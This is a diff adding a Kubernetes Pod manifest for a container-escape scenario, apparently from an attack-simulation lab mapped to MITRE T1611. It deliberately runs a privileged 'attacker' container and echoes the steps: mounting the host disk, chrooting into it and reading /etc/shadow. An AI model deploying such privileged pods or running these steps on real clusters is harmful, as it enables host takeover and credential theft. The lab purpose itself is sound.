@@ -1,0 +1,33 @@
+# KOAD-S13: Privileged Container Escape — mount device
+# ATT&CK: T1611 — Escape to Host
+# Attack: fdisk -l → mount host disk → chroot → full host access
+---
+apiVersion: v1
+kind: Pod
+metadata:
+  name: escape-privileged
+  namespace: koad
+  labels:
+    koad-scenario: S13
+    mitre-attck: T1611
+    escape-method: mount-device
+spec:
+  containers:
+    - name: attacker
+      image: ubuntu:22.04
+      command: ["sh", "-c"]
+      args:
+        - |
+          echo "=== KOAD-S13: Privileged Escape — Mount Device ==="
+          echo ""
+          echo "Attack steps:"
+          echo "  1. fdisk -l                        # List host disks"
+          echo "  2. mkdir -p /mnt/host"
+          echo "  3. mount /dev/sda1 /mnt/host       # Mount host root"
+          echo "  4. chroot /mnt/host /bin/bash       # Chroot into host"
+          echo "  5. cat /etc/shadow                  # Read host secrets"
+          echo ""
+          echo "Now you have full host filesystem access."
+          sleep infinity
+      securityContext:
+        privileged: true
